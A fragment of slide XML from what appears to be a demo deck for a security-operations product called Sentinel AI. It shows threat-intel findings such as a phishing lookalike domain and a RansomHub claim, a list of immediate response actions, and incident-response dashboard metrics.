        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="88" name="TextBox 87"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8567928" y="4581144"/>
            <a:ext cx="1234440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>VPN infrastructure</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89" name="TextBox 88"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9893808" y="4581144"/>
            <a:ext cx="2331720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Patch Ivanti. Takedown.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90" name="Rectangle 89"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4800600"/>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92608" y="4837176"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>dw-005</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92" name="TextBox 91"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="886968" y="4837176"/>
            <a:ext cx="1005840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Brand Abuse</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="93" name="TextBox 92"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1984248" y="4837176"/>
            <a:ext cx="640080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MEDIUM</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="94" name="TextBox 93"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2715768" y="4837176"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MONITORED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="TextBox 94"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3675888" y="4837176"/>
            <a:ext cx="1005840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OSINT</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="96" name="TextBox 95"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4773168" y="4837176"/>
            <a:ext cx="3703320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>globalship-secure[.]com registered 3 days ago. Hosting phishing page.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="TextBox 96"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8567928" y="4837176"/>
            <a:ext cx="1234440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Brand impersonation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="98" name="TextBox 97"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9893808" y="4837176"/>
            <a:ext cx="2331720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Register domain. Report.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="Rectangle 98"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5184648"/>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28600" y="5221224"/>
            <a:ext cx="11731752" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Mandatory Immediate Actions — CRITICAL Findings</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="101" name="Rectangle 100"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5458968"/>
            <a:ext cx="11731752" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1409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47472" y="5495544"/>
            <a:ext cx="11594592" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1. Force password reset for ALL 1,247 compromised accounts within 2 hours. Revoke all active sessions. Enable enforced MFA for all accounts immediately.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="103" name="Rectangle 102"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5733288"/>
            <a:ext cx="11731752" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1409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347472" y="5769864"/>
            <a:ext cx="11594592" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2. File GDPR breach notification within 72 hours for the 12,000 customer PII records. Engage legal and DPA. Notify affected customers.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="105" name="Rectangle 104"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="6007608"/>
            <a:ext cx="11731752" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1409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347472" y="6044184"/>
            <a:ext cx="11594592" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3. Declare a security incident for the RansomHub claim. Initiate forensic investigation — identify exfil vector, scope, and what data was taken.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="107" name="Rectangle 106"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="6281928"/>
            <a:ext cx="11731752" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="140F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347472" y="6318504"/>
            <a:ext cx="11594592" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4. Patch Ivanti Connect Secure immediately. Submit abuse report and takedown request to 0day.today for the $45,000 listing.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="109" name="Rectangle 108"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="6556248"/>
            <a:ext cx="11731752" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="140F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47472" y="6592824"/>
            <a:ext cx="11594592" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5. Seize/register globalship-secure.com lookalike domain. Report phishing infrastructure to registrar and Google Safe Browsing.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Incident Response</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Full incident lifecycle — triage · containment · investigation · resolution · SLA tracking</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Incident Response manages the complete lifecycle of every security incident, from the moment an alert fires through to post-incident review. Each incident record captures: severity, category, status, assigned analyst, affected assets, a timeline of all actions taken, MITRE ATT&amp;CK technique mapping, progress percentage toward containment, SLA deadline, and MTTR (Mean Time to Resolve). The status workflow is: Investigating → Containment → Analysis → Resolved. Critical incidents that breach their SLA are flagged in red and automatically escalate to the CISO. Sentinel AI suggests investigation playbooks based on the incident category and linked CVEs — so analysts have a step-by-step guide rather than starting from a blank screen.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="2148840"/>
            <a:ext cx="233172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33172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2240280"/>
            <a:ext cx="2112264" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Active Incidents</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="2423160"/>
            <a:ext cx="2112264" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>6</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="TextBox 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="2679192"/>
            <a:ext cx="2112264" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Open or in-progress</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2651760" y="2148840"/>
            <a:ext cx="233172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148840"/>
            <a:ext cx="233172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61488" y="2240280"/>
            <a:ext cx="2112264" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Critical</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="TextBox 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2761488" y="2423160"/>
            <a:ext cx="2112264" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2761488" y="2679192"/>
            <a:ext cx="2112264" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ransomware · S3 breach</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5074920" y="2148840"/>
            <a:ext cx="2331720" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="762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4920" y="2148840"/>
            <a:ext cx="2331720" cy="36576"/>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84648" y="2240280"/>
            <a:ext cx="2112264" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SLA Breached</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="TextBox 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5184648" y="2423160"/>
            <a:ext cx="2112264" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5184648" y="2679192"/>
            <a:ext cx="2112264" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Escalated to CISO</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7498079" y="2148840"/>
            <a:ext cx="2331720" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="762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98079" y="2148840"/>
            <a:ext cx="233172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07807" y="2240280"/>
            <a:ext cx="2112264" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Resolved</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="TextBox 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7607807" y="2423160"/>
            <a:ext cx="2112264" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="TextBox 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7607807" y="2679192"/>
            <a:ext cx="2112264" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Within SLA window</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Rectangle 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9921240" y="2148840"/>
            <a:ext cx="2011680" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="762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21240" y="2148840"/>
            <a:ext cx="2011680" cy="36576"/>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30968" y="2240280"/>
            <a:ext cx="1792224" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Avg MTTR</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10030968" y="2423160"/>
            <a:ext cx="1792224" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2.5h</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="TextBox 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10030968" y="2679192"/>
            <a:ext cx="1792224" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Last 30 days</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Rectangle 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3017520"/>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8600" y="3054096"/>
            <a:ext cx="11731752" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
